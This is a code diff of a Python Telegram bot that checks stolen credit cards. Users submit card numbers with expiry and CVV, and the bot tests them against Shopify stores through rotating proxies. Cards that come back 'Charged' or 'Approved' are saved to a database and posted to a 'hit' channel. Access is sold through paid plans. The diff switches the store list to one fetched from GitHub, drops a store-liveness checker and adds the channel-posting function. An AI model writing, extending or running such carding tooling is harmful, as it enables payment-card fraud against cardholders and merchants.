-@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
-async def list_sites(event):
-    try:
-        if not await force_join_check(event): return
-        plan = await get_user_plan(event.sender_id)
-        if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
-        sites = await get_user_sites(event.sender_id)
-        if not sites: return await styled_reply(event, f"{PE} <b>No sites</b> <code>/add</code>", emoji_ids=[CE["warn"]])
-        text = f"{PE} <b>Sites</b> ({len(sites)}) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
-        eid = [CE["fire"], CE["fire"]]
-        for i, s in enumerate(sites[:50], 1): text += f"{PE} <code>{i}.</code> <b>{s}</b>\n"; eid.append(CE["link"])
-        if len(sites) > 50: text += f"\n<i>+{len(sites)-50} more</i>"
-        await styled_reply(event, text, emoji_ids=eid)
-    except Exception as e: await event.reply(f"⚠️ Error in /sites: {e}")
-
-@client.on(events.NewMessage(pattern=r'(?i)^[/.]site$'))
-async def check_sites_cmd(event):
-    try:
-        if not await force_join_check(event): return
-        plan = await get_user_plan(event.sender_id)
-        if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
-        sites = await get_user_sites(event.sender_id)
-        if not sites: return await styled_reply(event, f"{PE} <b>No sites</b>", emoji_ids=[CE["warn"]])
-        uid = event.sender_id
-        PENDING_SITE_CHECK[uid] = {"sites": sites, "event": event}
-        kb = [[pbtn("0-5 USD", f"siteprice:5:{uid}"), pbtn("0-10 USD", f"siteprice:10:{uid}")],
-              [pbtn("0-20 USD", f"siteprice:20:{uid}"), pbtn("0-40 USD", f"siteprice:40:{uid}")]]
-        await styled_reply(event, f"{PE} <b>Select Price Range</b> {PE}\n{PE} <b>Sites:</b> <code>{len(sites)}</code>\n{PE} <i>Dead + over-price will be removed</i>", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["warn"]])
-    except Exception as e: await event.reply(f"⚠️ Error in /site: {e}")
-
-@client.on(events.CallbackQuery(pattern=rb"siteprice:(\d+):(\d+)"))
-async def site_price_cb(event):
-    max_price = int(event.pattern_match.group(1).decode())
-    uid = int(event.pattern_match.group(2).decode())
-    if event.sender_id != uid: return await event.answer(f"Not yours!", alert=True)
-    data = PENDING_SITE_CHECK.pop(uid, None)
-    if not data: return await event.answer(f"Expired!", alert=True)
-    await event.answer(f"Checking...")
-    try: await event.delete()
-    except: pass
-    asyncio.create_task(_process_site_check(data["event"], data["sites"], max_price))
-
-async def _process_site_check(event, sites, max_price):
-    uid = event.sender_id
-    total = len(sites); tested = alive_count = dead_count = kept_count = removed_price = 0
-    proxies = await get_all_user_proxies(uid)
-    user_site_sem = get_user_sem(uid, "site")
-    http_session = await get_user_http_session(uid, "site")
-    sm = await styled_reply(event, f"{PE} <b>Checking {total} sites...</b>", emoji_ids=[CE["fire"]])
-    last_ui = [0]; dead_sites = set(); price_removed_sites = set()
-    async def update_ui():
-        now = time.time()
-        if now - last_ui[0] < 3.0: return
-        last_ui[0] = now
-        try: await styled_edit(sm, f"{PE} <b>{tested}/{total}</b> | ✅{alive_count} ❌{dead_count}", emoji_ids=[CE["fire"]])
-        except: pass
-    async def check_worker(site):
-        nonlocal tested, alive_count, dead_count, kept_count, removed_price
-        async with user_site_sem:
-            try:
-                res = await test_site(site, random.choice(proxies) if proxies else None, http_session=http_session)
-                tested += 1
-                if res['status'] == 'alive':
-                    alive_count += 1; pv = 0
-                    ps = res.get('price', '-')
-                    if ps and ps != '-':
-                        try: pv = float(str(ps).replace('$', '').strip())
-                        except: pass
-                    if pv <= max_price: kept_count += 1
-                    else: removed_price += 1; price_removed_sites.add(normalize_site_url(site))
-                else: dead_count += 1; dead_sites.add(normalize_site_url(site))
-                await update_ui()
-            except: dead_count += 1; tested += 1; dead_sites.add(normalize_site_url(site))
-    for i in range(0, len(sites), SITE_PER_USER_WORKERS):
-        await asyncio.gather(*[asyncio.create_task(check_worker(s)) for s in sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
-    for s in sites:
-        n = normalize_site_url(s)
-        if n in dead_sites or n in price_removed_sites: await remove_site_db(uid, s)
-    try: await styled_edit(sm, f"""{PE} <b>Done</b> | ✅{alive_count} ❌{dead_count} | Kept:{kept_count} | Removed:{dead_count + removed_price}""", emoji_ids=[CE["fire"]])
-    except: pass
-    await cleanup_user_http_session(uid, "site"); cleanup_user_sem(uid)
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
 async def add_proxy_cmd(event):
@@ -1076,23 +802,21 @@ async def single_cc_check(event):
         try: sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or username
         except: username, name = f"user_{uid}", "User"
         
+        # سحب المواقع من جيت هب
+        sites = await get_github_sites()
+        if not sites: return await styled_reply(event, f"{PE} <b>No sites available from GitHub!</b>", emoji_ids=[CE["warn"]])
+        
         if is_paid_plan(plan) or uid in ADMIN_ID:
-            sites = await get_user_sites(uid); proxies = await get_all_user_proxies(uid)
+            proxies = await get_all_user_proxies(uid)
         else:
-            sites, proxies = [], []
+            proxies = []
             for aid in ADMIN_ID:
-                sites = await get_user_sites(aid); proxies = await get_all_user_proxies(aid)
-                if sites: break
-            if not sites:
-                try: sites = await get_global_sites()
-                except: pass
+                proxies = await get_all_user_proxies(aid)
+                if proxies: break
 
-        sites.extend(get_txt_sites())
-        sites = list(dict.fromkeys([s for s in sites if s]))
         proxies.extend(get_txt_proxies())
         proxies = list({p['proxy_url']: p for p in proxies if p}.values())
 
-        if not sites: return await styled_reply(event, f"{PE} <b>No sites! </b><code>/add</code>", emoji_ids=[CE["warn"]])
         rm = await event.get_reply_message() if event.reply_to_msg_id else None
         card = _get_card_from_event(event, rm)
         if not card: return await styled_reply(event, f"{PE} <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
@@ -1113,28 +837,30 @@ async def single_cc_check(event):
             elapsed = round(time.time() - st, 2)
             status = result.get('Status', 'Declined')
             
-            msg, eid = format_simple_card_result(status, card, result.get('Gateway', '?'), result.get('Response', '')[:150], bi, elapsed, extra_field=("Price", result.get('Price', '-')) if result.get('Price', '-') != '-' else None)
+            msg, eid = format_card_result(status, card, result.get('Gateway', '?'), result.get('Response', '')[:150], result.get('Price', '-'), bi, elapsed)
             
             try: await lm.delete()
             except: pass
             
-            # محاولة الإرسال مع GIF بأمان
+            # --- سحب وإرسال GIF في حال الصيدة بأمان تام ---
             gif_io = await fetch_random_gif() if status in ["Charged", "Approved"] else None
             sent = False
+            
             if gif_io:
                 try:
                     await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON, file=gif_io)
                     sent = True
-                except: pass
+                except Exception as e:
+                    print(f"GIF Reply Error: {e}")
             
-            # إذا فشلت صورة الأنمي (أو كانت غير مطلوبة)، يتم إرسال النص لتفادي اختفاء الصيدة
+            # إذا فشلت صورة الأنمي، يتم إرسال النص لتفادي اختفاء الصيدة
             if not sent:
                 await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
 
             # تسجيل وإرسال للقناة
             if status in ["Charged", "Approved"]:
                 asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), result.get('Gateway', ''), result.get('Price', '-')))
-                asyncio.create_task(send_channel_hit(result, uid, username, name, "Shopify", status))
+                asyncio.create_task(send_channel_hit(result, uid, username, name, result.get('Gateway', '?'), status))
                 
         except Exception as inner_e:
             try: await lm.delete()
@@ -1155,6 +881,19 @@ async def stop_cmd(event):
             stopped_any = True
     if not stopped_any: return await styled_reply(event, f"{PE} <b>No active session</b>", emoji_ids=[CE["warn"]])
     await styled_reply(event, f"{PE} <b>Stopping...</b>", emoji_ids=[CE["stop"]])
+
+# دالة مساعدة لإرسال الصيدة إلى القناة بأمان
+async def send_channel_hit(result, uid, username, name, gateway, status="Charged"):
+    if not HIT_CHANNEL_ID: return
+    try:
+        card = result.get("card", "")
+        resp = result.get("Response", "")
+        price = result.get("Price", "-")
+        bi = await get_bin_info(card.split("|")[0])
+        msg, eid = format_card_result(status, card, gateway, resp, price, bi, 0.0)
+        msg += f"\n\n👤 <b>User:</b> <a href='tg://user?id={uid}'>{name}</a> (<code>{username}</code>)"
+        await styled_send(HIT_CHANNEL_ID, msg, emoji_ids=eid, buttons=HIT_BUTTON)
+    except: pass
 
 async def _run_mass_process(event, cards, proxies, send_approved, process_store, stop_prefix, check_func, gate_name, sem_type):
     uid = event.sender_id
@@ -1181,6 +920,7 @@ async def _run_mass_process(event, cards, proxies, send_approved, process_store,
         if now - last_ui[0] < 3.0 or is_stopped(): return
         last_ui[0] = now
         
+        # --- تصميم أزرار جديد وأنيق ---
         kb = [
             [pbtn(f"💳 {lcd}", "none")],
             [pbtn(f"✅ Charged: {charged}", "none"), pbtn(f"⚡ Approved: {approved}", "none")],
@@ -1262,7 +1002,7 @@ async def _send_mass_hit(card, result, status, uid, username, name):
         gw = result.get('Gateway', 'Shopify')
         resp = result.get('Response', '')[:150]
         
-        msg, eid = format_card_result(status, card, gw, resp, result.get('Price', '-'), result.get('site', '-'), bi, 0.0)
+        msg, eid = format_card_result(status, card, gw, resp, result.get('Price', '-'), bi, 0.0)
         
         gif_io = await fetch_random_gif() if status in ["Charged", "Approved"] else None
         sent = False
@@ -1276,9 +1016,9 @@ async def _send_mass_hit(card, result, status, uid, username, name):
         if not sent:
             await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
             
-        # إرسال للقناة العامة إن وجدت
+        # إرسال للقناة
         if status in ["Charged", "Approved"]:
-            asyncio.create_task(send_channel_hit(result, uid, username, name, "Shopify", status))
+            asyncio.create_task(send_channel_hit(result, uid, username, name, gw, status))
             
     except: pass
 
@@ -1327,16 +1067,13 @@ async def mass_check_cmd(event):
             elif rm.text: content = rm.text
         else: return await styled_reply(event, f"{PE} <b>Reply to .txt or paste cards after </b><code>/msp</code>", emoji_ids=[CE["info"]])
         
-        sites = await get_user_sites(uid)
+        sites = await get_github_sites()
+        if not sites: return await styled_reply(event, f"{PE} <b>No sites available from GitHub!</b>", emoji_ids=[CE["warn"]])
+        
         proxies = await get_all_user_proxies(uid)
-
-        sites.extend(get_txt_sites())
-        sites = list(dict.fromkeys([s for s in sites if s]))
         proxies.extend(get_txt_proxies())
         proxies = list({p['proxy_url']: p for p in proxies if p}.values())
 
-        if not sites: return await styled_reply(event, f"{PE} <b>No sites! </b><code>/add</code>", emoji_ids=[CE["warn"]])
-        
         cards = extract_cc(content)
         if not cards: return await styled_reply(event, f"{PE} <b>No valid cards</b>", emoji_ids=[CE["cross"]])
         if len(cards) > cl: cards = cards[:cl]
@@ -1360,14 +1097,14 @@ async def mass_check_cmd(event):
 async def chk_pref_cb(event):
     pref = event.pattern_match.group(1).decode()
     uid = int(event.pattern_match.group(2).decode())
-    if event.sender_id != uid: return await event.answer(f"Not yours!", alert=True)
+    if event.sender_id != uid: return await event.answer("Not yours!", alert=True)
     data = USER_APPROVED_PREF.pop(f"chk_{uid}", None)
-    if not data: return await event.answer(f"Expired!", alert=True)
+    if not data: return await event.answer("Expired!", alert=True)
     try: await data["pref_msg"].delete()
     except: pass
-    if uid in ACTIVE_MTXT_PROCESSES: return await event.answer(f"Already running!", alert=True)
+    if uid in ACTIVE_MTXT_PROCESSES: return await event.answer("Already running!", alert=True)
     ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
-    await event.answer(f"Starting...")
+    await event.answer("Starting...")
     rotator = data.get("rotator", SmartRotator())
     sites, proxies = data["sites"], data["proxies"]
     async def shopify_check(card, http_session):
@@ -1378,14 +1115,14 @@ async def chk_pref_cb(event):
 @client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
 async def stop_chk_cb(event):
     puid = int(event.pattern_match.group(1).decode())
-    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer(f"Not yours!", alert=True)
+    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer("Not yours!", alert=True)
     proc = ACTIVE_MTXT_PROCESSES.get(puid)
-    if not proc: return await event.answer(f"None active!", alert=True)
+    if not proc: return await event.answer("None active!", alert=True)
     if isinstance(proc, dict):
         proc["stopped"] = True
         for t in proc.get("tasks", []):
             if not t.done(): t.cancel()
-    await event.answer(f"Stopping...", alert=True)
+    await event.answer("Stopping...", alert=True)
 
 # ====================== COMMANDS (ADMIN) ======================
 def _get_system_uptime():
@@ -1497,9 +1234,10 @@ async def _handle_plan_assign(event, plan_key):
     current_plan = await get_user_plan(target_uid); is_upgrade = is_paid_plan(current_plan)
     await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
     expiry_date = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
+    
+    # 🌟 هنا الرد الواحد فقط في المحادثة مع الأدمن
     await styled_reply(event, f"""<b>✅ Plan Updated</b>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>User</b> ↬ <a href='tg://user?id={target_uid}'>{target_name}</a>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>Plan</b> ↬ {pi['emoji']} <b>{pi['name']}</b>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>Duration</b> ↬ <code>{pi['duration_days']} days</code>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>Expires</b> ↬ <code>{expiry_date}</code>""")
-    try: await styled_send(target_uid, f"""<b>🎉 Plan Upgraded! 🎉</b>\n{pi['emoji']} <b>{pi['name']}</b> ━ <code>{pi['duration_days']}d</code>\nLimit: {get_cc_limit(pi['tier'])} CCs\nExpires: {expiry_date}""")
-    except: pass
+    
     try:
         receipt_id = f"CARDX-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
         lt = f"Plan RENEWED 🔄" if is_upgrade else f"New Plan 🛒"
@@ -1564,9 +1302,11 @@ async def stats_cmd(event):
     if event.sender_id not in ADMIN_ID: return
     try:
         tu = await get_total_users(); pu = await get_premium_count()
-        ts2 = await get_total_sites_count(); tc = await get_total_cards_count()
+        # تعويض بسيط لعدد المواقع بناء على جيتهب
+        ts2 = len(_CACHED_SITES) if _CACHED_SITES else 0 
+        tc = await get_total_cards_count()
         ch = await get_charged_count(); ap = await get_approved_count()
-        await styled_reply(event, f"""{PE} <b>Stats</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>Users:</b> <code>{tu}</code> | <b>Premium:</b> <code>{pu}</code>\n{PE} <b>Sites:</b> <code>{ts2}</code> | <b>Cards:</b> <code>{tc}</code>\n{PE} <b>Charged:</b> <code>{ch}</code> | <b>Approved:</b> <code>{ap}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>MSP Active:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["brain"], CE["shield"]])
+        await styled_reply(event, f"""{PE} <b>Stats</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>Users:</b> <code>{tu}</code> | <b>Premium:</b> <code>{pu}</code>\n{PE} <b>Sites (GitHub):</b> <code>{ts2}</code> | <b>Cards:</b> <code>{tc}</code>\n{PE} <b>Charged:</b> <code>{ch}</code> | <b>Approved:</b> <code>{ap}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>MSP Active:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["brain"], CE["shield"]])
     except Exception as e: await styled_reply(event, f"{PE} <b>Error:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
 
 # ====================== MAIN LOOP ======================
@@ -1584,6 +1324,10 @@ async def main():
                 result = await resp.json()
                 print(f"🚨 [WEBHOOK CLEANUP]: {result}")
     except Exception as e: print(f"🚨 [WEBHOOK CLEANUP ERROR]: {e}")
+
+    # التجهيز المسبق للمواقع من GitHub قبل البدء
+    log_system("BOOT", "Fetching sites from GitHub...")
+    await get_github_sites()
 
     while True:
         try:
